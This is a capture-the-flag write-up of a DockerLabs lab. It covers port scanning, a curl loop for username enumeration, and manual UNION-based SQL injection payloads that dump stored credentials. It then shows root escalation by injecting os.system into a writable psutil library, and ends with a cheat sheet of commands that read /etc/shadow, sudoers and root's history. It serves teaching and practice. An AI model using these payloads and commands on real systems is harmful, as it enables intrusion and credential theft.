As always, I begin by scanning ports and service, using Nmap with the following flags:

- `-p-` to scan all ports,
- `--open` to display only open ports and ignore those that are closed or filtered,
- `--min-rate 5000` to send a minimum of 5000 packets per second,
- `-n` to disable reverse DNS lookup,
- `-Pn` to assume the host is alive,
- `-sS` for a SYN scan, which is a stealth technique that does not complete TCP connections,
- `-vvv` for increased verbosity.

```
sudo nmap -p- --open --min-rate 5000 -n -Pn -sS 172.17.0.2 -oN logsnmap 
```

![image](https://github.com/kvlx-alt/DockerLabs-WriteUps/assets/118694485/88de5ccd-6daa-4564-93e9-235227f17210)



Only two ports were open, suggesting that the intrusion point is likely through the website. To gather more information, I used the WhatWeb tool.

```
whatweb http://172.17.0.2/ 
```

![image](https://github.com/kvlx-alt/DockerLabs-WriteUps/assets/118694485/4dd522ef-217e-4ca6-b6f0-c29ad36fe548)

The output provided some details about the target, but nothing immediately useful for exploitation. Therefore, I decided to inspect the website in a browser.

![image](https://github.com/kvlx-alt/DockerLabs-WriteUps/assets/118694485/4e692091-1dfe-474a-a7c7-06bc2094646d)

The site appears to be a user search application with a note: "Avoid tools that automate; you learn more by doing it manually." The application seems to be designed to search for usernames input by the user.

![image](https://github.com/kvlx-alt/DockerLabs-WriteUps/assets/118694485/0a569727-d86a-4967-a69b-c4e819932e9d)

I tried to search for the user "test" but got an alert saying "Unauthorized query." This is unusual because "test" is just a name, not some type of query or injection.

Additionally, I noticed that the form uses a GET method  to query the database and retrieve the user.

![image](https://github.com/kvlx-alt/DockerLabs-WriteUps/assets/118694485/0147d3ff-c95a-441d-a2da-b8199d6f6891)
![image](https://github.com/kvlx-alt/DockerLabs-WriteUps/assets/118694485/21b81a11-e6d1-4710-ba75-77b5280e559a)

I immediately thought of inserting some SQL injection payloads into the URL or trying to inject something. Additionally, I considered brute-forcing the search application to find valid users in the system. However, before proceeding, I decided to further enumerate the website for hidden directories or files using FFUF or Dirsearch.

```
dirsearch -u 'http://172.17.0.2/' -w $fuzz -e php,txt,html
OR
ffuf -u 'http://172.17.0.2/FUZZ' -w $fuzz -e .php,.txt,.html
```

![image](https://github.com/kvlx-alt/DockerLabs-WriteUps/assets/118694485/4d2e76e8-ba21-4a9d-aaba-88661450f082)
![image](https://github.com/kvlx-alt/DockerLabs-WriteUps/assets/118694485/7990e6f7-2027-4640-920f-a2d6970358ec)

I found nothing initially, so I tried searching for more usernames. When I tried the username "admin," I obtained some credentials.

![image](https://github.com/kvlx-alt/DockerLabs-WriteUps/assets/118694485/6edf3848-c221-42c9-9ba2-799da960c184)

However, I couldn't find a login panel or any other application to use these credentials. Therefore, I thought they might be for the SSH service. Let's check.

![image](https://github.com/kvlx-alt/DockerLabs-WriteUps/assets/118694485/135defc9-f540-422f-ac7a-a2c3c10eaee9)

These credentials are not for the SSH service, so now I'm unsure of their purpose.

While searching for usernames, I received an "Unauthorized query" alert. This suggested that there might be valid queries that could work, possibly indicating a SQL injection vulnerability. Since we were able to find the admin username, there might be other usernames we could discover. I wrote a small Bash one-liner to brute-force this application and try to retrieve more usernames.

```
while IFS= read -r username ;do echo -ne "\rTrying Username > $username >"; tput el; curl -s "http://172.17.0.2/?user=$username" | grep -q "Unauthorized" || echo " Username Found > $username"; done < /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt
```

I discovered several usernames. However, when tested, most returned "No results found" rather than "Unauthorized query."

![image](https://github.com/kvlx-alt/DockerLabs-WriteUps/assets/118694485/78558e1f-4e3c-4206-8dba-b9f06214b03d)

One particular username caught my attention: "select." To me, this doesn't seem like a regular username. As I mentioned before, this suggests an SQL injection vulnerability since "select" is a SQL query.

At this point, we have both credentials and a vulnerability. Let's exploit this SQL injection manually, as the first message suggests: "Avoid tools that automate; you learn more by doing it manually."

In SQL injection, we first need to confirm the vulnerability, determine the number of columns, and then inject queries.

When attempting to inject the typical query (`' or 1=1-- -`), we got an "Unauthorized query" alert.

![image](https://github.com/kvlx-alt/DockerLabs-WriteUps/assets/118694485/f1cb7044-bbd1-4c34-8c03-2c186588e62b)


Trying other queries resulted in the same alert, so I decided to experiment with '" order by". Surprisingly, this query yielded a "No results found" alert, indicating that it was allowed.

![image](https://github.com/kvlx-alt/DockerLabs-WriteUps/assets/118694485/305e7c98-5c00-4db7-88bc-e5321a95f1a3)

Let's determine the number of columns using this query:

- `' order by 4-- -`: This query didn't trigger the "No results found" alert.
- `' order by 3-- -`: This query did trigger the alert.

By experimenting with the alert that appears, I was able to ascertain the number of columns.

Now, let's play with the "union select" query:

- `' union select 1,2,3-- -`: This should display values if there are three columns.

![image](https://github.com/kvlx-alt/DockerLabs-WriteUps/assets/118694485/5b48dacb-17ba-4a70-9596-6bfd1a6f9057)

- `' union select 1,database(),3-- -`: This should display the currently used database.
![image](https://github.com/kvlx-alt/DockerLabs-WriteUps/assets/118694485/3f5b1ed4-1514-4f15-86a0-869ad175ad64)

- `' union select 1,version(),3-- -`: This should display the MariaDB version.

![image](https://github.com/kvlx-alt/DockerLabs-WriteUps/assets/118694485/ead642a8-fbbd-46c8-84b8-d88999aa45a7)
- `' union select 1,schema_name,3 from information_schema.schemata-- -`: This should list the databases.

![image](https://github.com/kvlx-alt/DockerLabs-WriteUps/assets/118694485/523ecadc-0a9e-4e8a-bcd4-5519d11bc154)

- `' union select 1,table_name,3 from information_schema.tables where table_schema='testdb'-- -`: This should enumerate the tables.

![image](https://github.com/kvlx-alt/DockerLabs-WriteUps/assets/118694485/b53d6537-48ad-4274-9d38-055ce0916f1b)


- `' union select 1,column_name,3 from information_schema.columns where table_schema='testdb' and table_name='users'-- -`: This should list the columns.

![image](https://github.com/kvlx-alt/DockerLabs-WriteUps/assets/118694485/aa9d0595-e4ce-403e-8d7c-4c4ffbebe82c)

- `' union select 1,group_concat(username,':',password),3 from testdb.users-- -`: This should enumerate the usernames and passwords.

![image](https://github.com/kvlx-alt/DockerLabs-WriteUps/assets/118694485/826cb028-6997-4656-a0ac-3db8dd9b9084)


We obtained additional credentials through the SQL injection vulnerability. 
Using the username "kvzlx," we gained access to the server.

![image](https://github.com/kvlx-alt/DockerLabs-WriteUps/assets/118694485/22e613b9-39fa-4cc0-a964-c3c214a09fe9)

**Now its time to escalate privilege!!**

In the user's home directory, there is a Python script named "system_info.py" and a note. Upon checking permissions, we can execute and read this script.
![image](https://github.com/kvlx-alt/DockerLabs-WriteUps/assets/118694485/4c9bb9bb-0c4d-4c6f-9fe7-2cc001e4153d)

This script,  utilizes the `psutil` library in Python to gather information about the system's virtual memory. There doesn't appear to be any obvious vulnerability in the script.

I explored other possibilities but found nothing noteworthy. Then, I checked the sudo permissions and discovered that the user "kvzlx" has the ability to execute the script "system_info.py" as root using sudo.

![image](https://github.com/kvlx-alt/DockerLabs-WriteUps/assets/118694485/5a4e67a6-2c3f-463d-8fc0-1cb0f9d7295c)

However, once more, it doesn't appear to be vulnerable.

**I've enumerated many things on this server, and I'm going to share a list of useful commands for escalating privileges at the end of this write-up.**

One useful command is the one that can find world-writable files:
` find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null `

After executing the previous command, we obtain something very useful
![image](https://github.com/kvlx-alt/DockerLabs-WriteUps/assets/118694485/2eb27d7e-454f-4d8a-97a1-0259b714dfba)

If we examine the script "system_info.py," we see that it imports the `psutil` module and utilizes the `virtual_memory()` function. Additionally, it's worth noting that we have write permissions for the `psutil/__init__.py` file.

This implies the potential for a Python Library Hijacking exploit. With write permissions to this library, we can inject commands that enable privilege escalation. Since any functional code we write within this library will be executed as root, given our root permissions to execute the "system_info.py" script, we can import the `os` module, if not already imported in the library, which allows us to execute system commands.

![image](https://github.com/kvlx-alt/DockerLabs-WriteUps/assets/118694485/4fb78e56-dba2-47c4-b8d4-8c476180aa5a)
 
![image](https://github.com/kvlx-alt/DockerLabs-WriteUps/assets/118694485/5853bcb1-9a68-439a-b20f-70b8d06dfc9c)

![image](https://github.com/kvlx-alt/DockerLabs-WriteUps/assets/118694485/40db61e2-61cc-43bf-955e-2e303d1d21a7)

As seen in the previous image, we inserted the command "os.system('id')" into the "psutil" library. Therefore, when we run the "system_info.py" script with sudo privileges, it displays the result of the "ID" command for root, thus confirming the Python Library Hijacking.  Next, we can proceed to modify the library again to insert another command that provides us with a root shell.

![image](https://github.com/kvlx-alt/DockerLabs-WriteUps/assets/118694485/e3fb6394-b469-4c54-bcef-d60a112393ba)

![image](https://github.com/kvlx-alt/DockerLabs-WriteUps/assets/118694485/335631b8-3aba-4434-9cba-14a132b711d4)

**That's all for now! I hope you enjoyed it and learned as much as I did while creating this lab. Cheers! kvzlx.**

> [!NOTE]
> **Helpful Commands for Privilege Escalation!**
> ```bash
> #Current user Information
> id
> 
> # Kernel Version
> uname -a
> 
> #Current User INformation from /etc/passwd
> grep $USER /etc/passwd
> 
> # Most Recent Logins
> lastlog
> 
> #Last Logged On Users
> last
> 
> # All users including UID and GID Information
> for user in $(cat /etc/passwd | cut -f1 -d":"); do id $user; done 
> 
> # List all UID 0(root) Accounts
> cat /etc/passwd | cut -f1,3,4 -d":" | grep "0:0" | cut -f1 -d":" | awk '{print $1}'
> 
> # Read passwd FIle
> cat /etc/passwd
> 
> # Check readability of the shadow file
> cat /etc/shadow
> 
> # What can we sudo without a password
> sudo -l
> 
> # Can we read the /etc/sudoers file
> cat /etc/sudoers
> 
> # Can we read roots .bash_history file
> cat /root/.bash_history
> 
> # Can we read any other user's .bash_history files
> find /home/* -name *.*history* - print 2> /dev/null
> 
> # Operating System
> cat /etc/issue
> cat /etc/*-release
> 
> # Can we sudo known binaries that allow breaking out into a shell
> sudo -l | grep vim
> sudo -l | grep nmap
> sudo -l | grep vi
> 
> # Can we list root's home directory
> ls -la /root/
> 
> # Curren $PATH environment variable
> echo $PATH
> 
> # List all cron jobs
> cat /etc/crontab && ls -la /etc/cron*
> 
> # Find world-writeable cron jobs
> find /etc/cron* -type f -perm -o+w -exec ls -l {} \;
> 
> # List running process
> ps auxwww
> 
> # List all processes running as root
> ps -u root
> 
> # List all processes running as current user
> ps -u $USER
> 
> # Find SUID files
> find / -perm -4000 -type f 2>/dev/null
> 
> # Find SUID files owned by root
> find / -uid 0 -perm -4000 -type f 2>/dev/null
> 
> # find GUID files
> find / -perm -2000 -type -f 2>/dev/null
> 
> # Find world-writable files
> find -perm -2 -type f 2>/dev/null
> 
> # List all conf files in /etc/
> ls -la /etc/*.conf
> 
> # Find conf files that contain the string "pass*"
> grep 'passw' /etc/*.conf
> 
> # List open files
> lsof -n
> 
> # List installed packages
> dpkg -l
> 
> # Common software versions
> sudo -V
> httpd -V
> apache2 -V
> mysql -V
> sendmail -d0.1
> 
> # Print process binaries/path and permissions
> ps aux | awk '{print $11}' | xargs -r ls -la 2>/dev/null | awk '!x[$0]++'
> 
> # Find world-writeable files
> find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
> 
> ```
> 
